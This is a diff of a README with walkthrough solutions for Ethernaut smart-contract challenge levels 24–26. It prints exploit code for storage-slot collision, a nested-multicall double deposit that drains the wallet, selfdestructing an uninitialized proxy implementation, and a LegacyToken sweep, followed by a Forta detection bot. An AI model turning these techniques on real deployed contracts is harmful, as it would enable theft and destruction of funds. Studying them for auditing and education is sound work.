@@ -928,19 +928,21 @@ await contract.swap(t3, t2, 200)
 ```
 We can always verify the balance of both tokens by using the `balanceOf()` function `await contract.balanceOf(t2, instance).then(v => v.toString())`
 Level solved!
+
 ## 24. Puzzle Wallet
-If you understand delegatecall, you should be able to solve this. Essentially what is happening is that the storage variable `pendingAdmin` is sharing the same storage slot with `owner` and the storage variable `admin` is sharing the same storage slot with `maxBalance`.
 
-In order to change admin, we need to modify `maxBalance` (set it to the uint value of your address) but to modify `maxBalance`, we need to reduce the balance of the contract to 0. The `execute` function allows you to withdraw funds from the contract. What we need to figure out is how to call `deposit` and how can we get the contract to register more than what was deposited.
+Here we need to use and understand delegatecall, and with that we should be able to solve this. We know that while using upgradeable patterns the thing to pay attention to is storage collision, so essentially here what is happening is that the storage variable `pendingAdmin` is sharing the same storage slot with `owner` and the storage variable `admin` is sharing the same storage slot with `maxBalance`.
 
-`deposit` can only be called by a whitelisted address and to be whitelisted, you need to be an owner. By setting yourself as `pendingAdmin`, you will become the owner since the `pendingAdmin` and `owner` storage slot is shared. Once you become the owner, you can whitelist yourself and call the `deposit` function.
+In order to change admin, we need to modify `maxBalance` (set it to the uint value of our address) but to modify `maxBalance`, we need to reduce the balance of the contract to 0. The `execute` function allows us to withdraw funds from the contract. What we need to figure out is how to call `deposit` and how can we get the contract to register more than what was deposited.
 
-In order to get the smart contract to register two deposits when only 1 was made, we need to take advantage of calling `multicall` within `multicall`. The reason why this works is because the `multicall` function checks for `deposit`'s function signature so by calling `deposit` within `multicall`, you are able to bypass the `require(!depositCalled, "Deposit can only be called once");` check.
+`deposit` can only be called by a whitelisted address and to be whitelisted, we need to be an owner. By setting ourself as `pendingAdmin`, we will become the owner, cause  the `pendingAdmin` and `owner` storage slot is shared. Once we become the owner, we can then whitelist ourselves and call the `deposit` function.
 
-Not to worry if you don't fully understand, the code will explain everything
+In order to get the smart contract to register two deposits when only 1 was made, we need to take advantage of calling `multicall` within `multicall`. The reason why this works is because the `multicall` function checks for `deposit`'s function signature so by calling `deposit` within `multicall`, we are able to bypass the `require(!depositCalled, "Deposit can only be called once");` check.
+
+Not to worry if you don't fully understand, the code and comments below will explain everything
 
 ```
-// Setting pending admin / owner
+// Set pending admin / owner
 pnaData = web3.eth.abi.encodeFunctionCall({
     name: 'proposeNewAdmin',
     type: 'function',
@@ -956,10 +958,10 @@ await web3.eth.sendTransaction({
     data: pnaData
 })
 
-// check that you are now the owner
+// check to see if we are the owner or not
 // await contract.owner()
 
-// Whitelist yourself
+// we whitelist our address
 wlData = web3.eth.abi.encodeFunctionCall({
     name: 'addToWhitelist',
     type: 'function',
@@ -1000,7 +1002,7 @@ nestedMulticallData = web3.eth.abi.encodeFunctionCall({
     }]
 }, [[depositData, multicallData]]);
 
-// This is where you deposit 0.001 ETH but the smart contract records it as 2 deposits (0.002 ETH)!
+// This is where we deposit 0.001 ETH but the smart contract records it as 2 deposits (0.002 ETH)!
 await web3.eth.sendTransaction({
     to: instance,
     from: player,
@@ -1008,7 +1010,7 @@ await web3.eth.sendTransaction({
     data: nestedMulticallData
 })
 
-// Check that the smart contract recorded your deposit twice
+// Check to see if the contract recorded our deposit twice
 // (await contract.balances(player)).toString()
 
 // Withdraw all (should be 0.002) funds!
@@ -1033,7 +1035,7 @@ await web3.eth.sendTransaction({
     data: executeData
 })
 
-// Set yourself as new admin by calling set max balance
+// Set ourselves as new admin by calling set max balance
 smbData = web3.eth.abi.encodeFunctionCall({
     name: 'setMaxBalance',
     type: 'function',
@@ -1041,7 +1043,7 @@ smbData = web3.eth.abi.encodeFunctionCall({
         type: 'uint256',
         name: '_maxBalance'
     }]
-}, ["<insert the uint value of your address here>"]);
+}, ["<insert the uint value of our address here>"]);
 
 await web3.eth.sendTransaction({
     to: instance,
@@ -1052,19 +1054,19 @@ await web3.eth.sendTransaction({
 
 ## 25. Motorbike
 
-Nowadays, using a proxy is quite a common pattern but if you don't understand what you are doing, it can lead to very disasterous consequences. This level is an example of what happened with [parity wallet](https://www.parity.io/blog/a-postmortem-on-the-parity-multi-sig-library-self-destruct/).
+Using proxies is a pretty common pattern in recent times, but this can lead to very disasterous consequences if one does not understand how to safely engage them. This level is an example of what happened witht the parity wallet.
+Here we want to destroy the Motorbike but within the motorbike contract, there isn't any `selfdestruct` calls. So innstead of attacking the Motorbike contract, we can instead attack the engine contract!
+Motorbike relies on the engine contract for its logic so if we can destroy the engine contract, the Motorbike is automatically rendered useless.
 
-We want to destroy the Motorbike but within the motorbike contract, there isn't any `selfdestruct` calls. Instead of attacking the Motorbike contract, why don't we attack the engine contract? Motorbike relies on the engine contract for its logic so if we can destroy the engine contract, the Motorbike is rendered useless.
-
-Let's interact directly with the engine contract and gain ownership of it. Once we're made the upgrader, we can easily upgrade the engine logic to a malicious contract and call `selfdestruct`.
+We interact directly with the engine contract and gain ownership of it. Once we make ourself the upgrader, we can easily upgrade the engine logic to a malicious contract and call `selfdestruct`.
 
 ```
-// Get the engine contract address
+// We get the engine contract address
 implAddr = await web3.eth.getStorageAt(instance, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
 
 implAddr = '0x' + implAddr.slice(26)
 
-// Call `initialize()` to become the upgrader
+// Now we can call `initialize()` to become the upgrader
 data = web3.eth.abi.encodeFunctionSignature("initialize()")
 await web3.eth.sendTransaction({
     from: player,
@@ -1072,23 +1074,23 @@ await web3.eth.sendTransaction({
     data: data
 })
 
-// Check that you are the upgrader
+// We can check to see if we are the upgrader
 // data = web3.eth.abi.encodeFunctionSignature("upgrader()")
 // await web3.eth.call({
 //     to: implAddr,
 //     data: data
 //     })
 
-// Create a bad contract and deploy it
+// Now we can hop on remix to create the Destro yEngine contract
 pragma solidity ^0.8.0;
 
-contract Kaboom {
+contract DestroyEngine {
     function explode() public {
         selfdestruct(payable(0));
     }
 }
 
-badContractAddr = "<insert bad contract address here>"
+DesEngAddr = "<we insert the destroy engine address here>"
 
 // create the payload to be called
 data = web3.eth.abi.encodeFunctionSignature("explode()")
@@ -1104,9 +1106,122 @@ upgradeToAndCallData = web3.eth.abi.encodeFunctionCall({
         name: 'data'
     }
 ]
-}, [badContractAddr, data])
+}, [DesEngAddr, data])
 
 
 // Execute self destruct
 await web3.eth.sendTransaction({from: player, to: implAddr, data: upgradeToAndCallData})
 ```
+
+Finally the engine is now destroyed and it can't be fixed cause all the upgrade logic is in the destroyed logic contract.
+
+## 26. Double Entry Point
+
+Here we can see that the natural behaviour of CryptoVault is to sweep any token except the DET token, but the problem is that by sweeping LegacyToken we are indirectly sweeping DET.
+
+So that means that `player` has to find the bug in the `CryptoVault` and create a Forta bot to protect it from being drained by raising an alert if CryptoVault’s address is the param of `origSender`
+
+
+First, let's look at the exploit that allows us to indirectly sweep DET by sweeping LegacyToken. 
+If we check out the `sweepToken()` method  we notice that it restricts sweeping the underlying tokens with a `require` check - as expected. But see  `LegacyToken`'s `transfer()` method:
+```solidity
+if (address(delegate) == address(0)) {
+    return super.transfer(to, value);
+} else {
+    return delegate.delegateTransfer(to, value, msg.sender);
+}
+```
+
+This means that it actually calls `delegateTransfer()` method of some `DelegateERC20` contract. But here this `DelegateERC20` is the implementation of the underlying (`DET`) token itself! And `delegateTransfer()` simply takes the given parameters and tranfer the tokens according to them. 
+The only limitation `delegateTransfer()` puts is that `msg.sender` must be the LegacyToken (`delegatedFrom` address) contract.
+
+This just means that we can indirectly sweep the underlying tokens through `transfer()` of `LegacyToken` contract. We just have to call `sweepToken` with address of `LegacyToken` contract. Which would consequently cause the  `LegacyContract` to call the `DoubleEntryPoint`'s (DET token) `delegateTransfer()` method. 
+
+```js
+vault = await contract.cryptoVault()
+
+// Check initial balance (100 DET)
+await contract.balanceOf(vault).then(v => v.toString()) // '100000000000000000000'
+
+legacyToken = await contract.delegatedFrom()
+
+// sweepTokens(..) function call data
+sweepSig = web3.eth.abi.encodeFunctionCall({
+    name: 'sweepToken',
+    type: 'function',
+    inputs: [{name: 'token', type: 'address'}]
+}, [legacyToken])
+
+// Send exploit transaction
+await web3.eth.sendTransaction({ from: player, to: vault, data: sweepSig })
+
+// Check balance (0 DET)
+await contract.balanceOf(vault).then(v => v.toString()) // '0'
+```
+
+And now `CryptoVault` is swept of DET tokens!
+
+This worked because during invocation `transfer()` of `LegacyToken` the `msg.sender` was `CryptoVault`. And when `delegateTransfer()` invoked right after, the `origSender` is the passed in address of `CryptoVault` contract and `msg.sender` is `LegacyToken` so `onlyDelegateFrom` modifier checks out.
+
+So now to the main aim of this level which is to prevent this exploit we have to write a bot which would be a simple contract implementing the `IDetectionBot` interface. In the bot's `handleTransaction(..)` we should simply check that the address is not `CryptoVault` address. If otherwise, the bot should raise an alert. This thereby prevents the sweep
+
+Deploy the below on remix and get it's address.
+```solidity
+pragma solidity ^0.8.0;
+
+interface IForta {
+    function raiseAlert(address user) external;
+}
+
+contract FortaDetectionBot {
+    address private cryptoVault;
+
+    constructor(address _cryptoVault) {
+        cryptoVault = _cryptoVault;
+    }
+
+    function handleTransaction(address user, bytes calldata msgData) external {
+        // Extract the address of original message sender
+        // which should start at offset 168 (0xa8) of calldata
+        address origSender;
+        assembly {
+            origSender := calldataload(0xa8)
+        }
+
+        if (origSender == cryptoVault) {
+            IForta(msg.sender).raiseAlert(user);
+        }
+    }
+}
+```
+
+NB: In the above `FortaDetectionBot` contract we extract the address of the original transaction sender by calculating its offset according to the [ABI encoding](https://docs.soliditylang.org/en/latest/abi-spec.html#argument-encoding) specs.
+
+Now we set the bot in `Forta` contract:
+```js
+// FortaDetectionBot
+botAddr = '0x...'
+
+// Forta contract address
+forta = await contract.forta()
+
+// setDetectionBot() function call data
+setBotSig = web3.eth.abi.encodeFunctionCall({
+    name: 'setDetectionBot',
+    type: 'function',
+    inputs: [
+        { type: 'address', name: 'detectionBotAddress' }
+    ]
+}, [botAddr])
+
+// Send the transaction setting the bot
+await web3.eth.sendTransaction({from: player, to: forta, data: setBotSig })
+```
+...
+
+And that is it for all the levels!
+The challenges were incredible and fun, i definitely was challenged, but it was worth it all in the end with the amount of new information I've learnt and can share.
+_If you learned something new/ awesome? Consider starring the 😄
+
+_and following me on twitter [here](https://twitter.com/bauchibred)_ 🙏
+
